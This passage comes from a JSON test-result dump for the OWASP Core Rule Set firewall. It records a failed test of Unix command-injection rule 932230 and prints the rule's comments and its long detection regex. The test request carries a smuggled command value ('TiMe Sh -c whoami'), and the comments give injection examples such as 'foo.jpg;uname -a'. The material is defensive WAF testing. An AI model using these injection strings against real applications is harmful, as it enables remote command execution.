]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?b|[hr][\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?c|p[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?g)[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:[\\s\\x0b&\\),<>\\|]|$).*))\\b"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932230
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Unix Command Injection (2-3 chars)"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-unix"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932230",
    "test_id" : 33,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932230.yaml",
    "description" : "System Command Injection test for BB finding AV6ZO3ZS - mixed case",
    "cause" : "failed expect_id check: 932230 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 33,
      "desc" : "System Command Injection test for BB finding AV6ZO3ZS - mixed case",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip, deflate, br",
            "Accept-Language" : "en-us,en;q=0.5"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo='TiMe+Sh+-c+whoami",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932230 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932230,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Unix command injection ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Unix command injections."
        }, {
          "type" : "Comment",
          "text" : " A command injection takes a form such as:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   foo.jpg;uname -a"
        }, {
          "type" : "Comment",
          "text" : "   foo.jpg||uname -a"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " The vulnerability exists when an application executes a shell command"
        }, {
          "type" : "Comment",
          "text" : " without proper input escaping/validation."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule is also triggered by an Oracle WebLogic Remote Command Execution exploit:"
        }, {
          "type" : "Comment",
          "text" : " [ Oracle WebLogic vulnerability CVE-2017-10271 - Exploit tested: https://www.exploit-db.com/exploits/43458 ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " To prevent false positives, we look for a 'starting sequence' that"
        }, {
          "type" : "Comment",
          "text" : " precedes a command in shell syntax, such as: ; | & $( ` <( >("
        }, {
          "type" : "Comment",
          "text" : " Anatomy of the regexp with examples of patterns caught:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " 1. Starting tokens"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " ;        ;ifconfig"
        }, {
          "type" : "Comment",
          "text" : " \\{       {ifconfig}"
        }, {
          "type" : "Comment",
          "text" : " \\|       |ifconfig"
        }, {
          "type" : "Comment",
          "text" : " \\|\\|     ||ifconfig"
        }, {
          "type" : "Comment",
          "text" : " &        &ifconfig"
        }, {
          "type" : "Comment",
          "text" : " &&       &&ifconfig"
        }, {
          "type" : "Comment",
          "text" : " \\n       ;\\nifconfig"
        }, {
          "type" : "Comment",
          "text" : " \\r       ;\\rifconfig"
        }, {
          "type" : "Comment",
          "text" : " \\$\\(     $(ifconfig)"
        }, {
          "type" : "Comment",
          "text" : " \\$\\(\\(   $((ifconfig))"
        }, {
          "type" : "Comment",
          "text" : " \\$\\[     $[2+2]"
        }, {
          "type" : "Comment",
          "text" : " `        `ifconfig`"
        }, {
          "type" : "Comment",
          "text" : " \\${      ${ifconfig}"
        }, {
          "type" : "Comment",
          "text" : " <\\(      <( ifconfig )"
        }, {
          "type" : "Comment",
          "text" : " >\\(      >( ifconfig )"
        }, {
          "type" : "Comment",
          "text" : " \\(\\s*\\)  a() ( ifconfig; ); a"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " 2. Command prefixes"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " {        { ifconfig }"
        }, {
          "type" : "Comment",
          "text" : " \\s*\\(\\s* ( ifconfig )"
        }, {
          "type" : "Comment",
          "text" : " \\w+=(?:[^\\s]*|\\$.*|\\$.*|<.*|>.*|\\'.*\\'|\\\".*\\\")\\s+   VARNAME=xyz ifconfig"
        }, {
          "type" : "Comment",
          "text" : " !\\s*     ! ifconfig"
        }, {
          "type" : "Comment",
          "text" : " \\$       $ifconfig"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " 3. Quoting"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " '        'ifconfig'"
        }, {
          "type" : "Comment",
          "text" : " \\\"       \"ifconfig\""
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " 4. Paths"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " [\\?\\*\\[\\]\\(\\)\\-\\|+\\w'\\\"\\./\\x5c]+/   /sbin/ifconfig, /s?in/./ifconfig, /s[a-b]in/ifconfig etc."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " An effort was made to combat evasions by shell quoting (e.g. 'ls',"
        }, {
          "type" : "Comment",
          "text" : " 'l'\"s\", \\l\\s are all valid). ModSecurity has a t:cmdLine"
        }, {
          "type" : "Comment",
          "text" : " transformation built-in to deal with this, but unfortunately, it"
        }, {
          "type" : "Comment",
          "text" : " replaces ';' characters and lowercases the payload, which is less"
        }, {
          "type" : "Comment",
          "text" : " useful for this case. However, emulating the transformation makes"
        }, {
          "type" : "Comment",
          "text" : " the regexp more complex."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This is the base Rule to prevent Unix Command Injection"
        }, {
          "type" : "Comment",
          "text" : " for prefix + two and three characters."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Rule relations:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932230 (base rule, PL1, targets prefix + two and three character commands)"
        }, {
          "type" : "Comment",
          "text" : "  ..932231 (stricter sibling, PL2, targets prefix + the source shortcut command)"
        }, {
          "type" : "Comment",
          "text" : "  ..932232 (stricter sibling, PL3, targets prefix + additional command words)"
        }, {
          "type" : "Comment",
          "text" : "  .932235 (base rule, PL1, targets prefix + known command word of length > 3 without evasion)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932250 (base rule, PL1, targets two and three character commands)"
        }, {
          "type" : "Comment",
          "text" : "  .932260 (base rule, PL1, targets known command word of length > 3 without evasion)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932240 (generic detection, PL2, targets generic evasion attempts)"
        }, {
          "type" : "Comment",
          "text" : "  .932236 (stricter sibling of 932230, 932235, 932250, 932260, PL2,"
        }, {
          "type" : "Comment",
          "text" : "       - with and without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length)"
        }, {
          "type" : "Comment",
          "text" : "  ..932239 (sibling of 932236, PL2,"
        }, {
          "type" : "Comment",
          "text" : "       - with and without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length"
        }, {
          "type" : "Comment",
          "text" : "       - targets request headers user-agent and referer only"
        }, {
          "type" : "Comment",
          "text" : "       - excluded words: known user-agents)"
        }, {
          "type" : "Comment",
          "text" : "  ..932238 (stricter sibling of 932236, PL3,"
        }, {
          "type" : "Comment",
          "text" : "       - no excluded words)"
        }, {
          "type" : "Comment",
          "text" : "  .932237 (stricter sibling of 932230, 932235, 932250, 932260, PL3,"
        }, {
          "type" : "Comment",
          "text" : "       - targets request headers user-agent and referer only"
        }, {
          "type" : "Comment",
          "text" : "       - without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - with word boundaries"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length"
        }, {
          "type" : "Comment",
          "text" : "       - excluded words: known user-agents)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932230.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932230"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:b[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?s[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?y[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?b[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?x|(?:c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?d|e[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?v|v[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?l)|w[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?h)[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:[\\s\\x0b&\\),<>\\|]|$).*|[ls][\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?r[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?e|n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?h[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?p|t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?i[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?e[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:(?:[\\s\\x0b&\\),<>\\|]|$).*|o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t)|[\\n\\r;=`\\{]|\\|\\|?|&&?|\\$(?:\\(\\(?|[\\[\\{])|<(?:\\(|<<)|>\\(|\\([\\s\\x0b]*\\))[\\s\\x0b]*(?:[\\$\\{]|(?:[\\s\\x0b]*\\(|!)[\\s\\x0b]*|[0-9A-Z_a-z]+=(?:[^\\s\\x0b]*|\\$(?:.*|.*)|[<>].*|'[^']*'|\\\"[^\\\"]*\\\")[\\s\\x0b]+)*[\\s\\x0b]*[\\\"']*(?:[\\\"'-\\+\\--9\\?A-\\]_a-z\\|]+/)?[\\\"'\\x5c]*(?:(?:7[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?z[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:[arx][\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?)?|(?:b[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?z[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?z|c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:[89][\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?9|m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?p|s[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?h)|d[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?)?f|e[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?v|q[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?n|s[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?h)|f[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:[dg]|m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t)|(?:h[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u|u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?d)[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?p|i[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?r[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?b|j[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:j[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?s|q)|[kz][\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?s[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?h|m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?r|p[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:d[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?b|k[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?g|t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?x|x[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?z)|r[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?p|m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t)|s[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?p|e[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?d|(?:s[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?)?h|v[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?n)|t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?c|b[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?l)|w[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:3[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m|c)|x[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:x[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?d|z)|y[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m)[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?|l[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:s[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?|z[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:4[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?)?))(?:[\\s\\x0b&\\),<>\\|]|$).*|a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?-[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:(?:[&\\),<>\\|]|$){1,10}|(?:[\\-\